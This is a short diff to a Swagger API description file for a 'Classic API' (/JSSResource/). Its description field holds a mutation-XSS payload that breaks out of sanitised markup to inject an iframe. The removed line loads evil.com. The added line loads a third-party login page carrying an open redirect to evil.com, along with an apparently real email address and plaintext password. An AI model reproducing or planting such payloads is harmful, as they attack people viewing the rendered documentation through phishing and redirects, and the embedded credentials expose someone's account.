@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><iframe src='https://evil.com'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><iframe src='https://www.inditexcareers.com/portalweb/en/login?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=1&_58_struts_action=%2Flogin%2Flogin&_58_saveLastPath=false&_58_redirect=https:%2F%2Fevil.com&_58_doActionAfterLogin=false&_58_viewDialogLogin=1&_58_login=jakre1234%2B22%40protonmail.com&_58_password=Facebook%401234&signup='>"></form>
 
   version: production
 basePath: /JSSResource/
